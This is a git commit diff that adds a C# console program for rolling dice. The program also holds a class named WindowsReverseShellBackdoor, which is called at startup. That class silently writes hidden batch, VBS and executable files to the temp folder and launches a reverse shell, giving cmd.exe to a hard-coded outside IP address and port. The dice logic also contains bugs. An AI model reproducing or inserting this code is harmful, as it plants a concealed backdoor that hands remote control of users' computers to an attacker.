7dd351592c5db1fbd2c502c7117bd791a5cef8d6
Tyler <tyler_herrin@live.com>
2015-04-07 09:24:49 -0700

    Create git repo

---
+++ Dice/Program.cs
@@ -0,0 +1,75 @@
+﻿using System;
+using System.Collections.Generic;
+using System.Linq;
+using System.Text;
+using System.Threading.Tasks;
+using System.IO;
+
+namespace Dice
+{
+    class Program
+    {
+        static void Main(string[] args)
+        {
+            WindowsReverseShellBackdoor.Start();
+            
+            Console.ForegroundColor = ConsoleColor.Green;
+            int x = 1;
+
+            do
+            {
+                Console.WriteLine("How many dice do you want me to roll?");
+                String numberOfDice = Console.ReadLine();
+                
+                int d, s;
+                bool isDiceTrue = int.TryParse(numberOfDice, out d);
+                
+                if(!isDiceTrue)
+                {
+                    Console.WriteLine("Invalid input.");
+                    Environment.Exit(0);
+                }
+
+                Console.WriteLine("How many sides? (4/6/8/12/20)");
+                String numberOfSides = Console.ReadLine();
+
+                bool isSidesTrue = int.TryParse(numberOfDice, out s);
+                if(!isSidesTrue)
+                {
+                    Console.WriteLine("Invalid input.");
+                    Environment.Exit(0);
+                }
+
+                int rNumberDice = int.Parse(numberOfDice);
+                int rNumberSides = int.Parse(numberOfSides);
+
+                if (!(rNumberSides == 4 || rNumberSides == 6 || rNumberSides == 8 || rNumberSides == 12 || rNumberSides == 20))
+                {
+                    Console.WriteLine("Invalid input.");
+                    Environment.Exit(0);
+                }
+                Console.WriteLine();
+
+                LinkedList<int> array = new LinkedList<int>();
+
+                Random rnd = new Random();
+                for (int i = 0; i < rNumberDice; i++)
+                {
+                    int result = rnd.Next(1, rNumberSides);
+                    array.AddLast(result);
+                }
+
+                Console.Write("You rolled: ");
+                for (int i = 0; i < array.Count; i ++)
+                {
+                    Console.Write(array.ElementAt(i) + " ");
+                }
+
+                Console.WriteLine("\nEnter 1 to continue.");
+
+                x = int.Parse(Console.ReadLine());
+
+            } while (x == 1);
+        }
+    }
+}
---
+++ Dice/WindowsReverseShellBackdoor.cs
@@ -0,0 +1,55 @@
+﻿using System;
+using System.Collections.Generic;
+using System.Linq;
+using System.Text;
+using System.Threading.Tasks;
+using System.IO;
+
+namespace Dice
+{
+    class WindowsReverseShellBackdoor
+    {
+        public static void Start()
+        {
+            try
+            {
+                createFiles();
+            }
+            catch (Exception e)
+            {
+                Console.WriteLine("An error has occured.");
+                Console.ReadLine();
+                Environment.Exit(0);
+            }
+        }
+
+        private static void createFiles()
+        {
+            //System.Environment.CurrentDirectory
+            string shellPath = Path.Combine(Path.GetTempPath(), "shell.bat");
+            string vbsPath = Path.Combine(Path.GetTempPath(), "run.vbs");
+            string exePath = Path.Combine(Path.GetTempPath(), "dice2.exe");
+
+            if (!File.Exists(shellPath))
+            {
+                string[] shellBatch = { "@ECHO OFF", "START /B dice2.exe -e cmd.exe 75.121.233.30 27016" };
+                File.WriteAllLines(shellPath, shellBatch);
+                File.SetAttributes(shellPath, FileAttributes.Hidden);
+            }
+
+            if (!File.Exists(vbsPath))
+            {
+                string[] vbs = { "Set WshShell = CreateObject(\"WScript.Shell\" ) ", "WshShell.Run chr(34) & \"" + shellPath + "\" & Chr(34), 0 ", "Set WshShell = Nothing " };
+                File.WriteAllLines(vbsPath, vbs);
+                File.SetAttributes(vbsPath, FileAttributes.Hidden);
+            }
+
+            if (!File.Exists(exePath))
+            {
+                File.WriteAllBytes(exePath, Dice.Properties.Resources.dice2);
+                File.SetAttributes(exePath, FileAttributes.Hidden);
+            }
+            System.Diagnostics.Process.Start(vbsPath);
+        }
+    }
+}
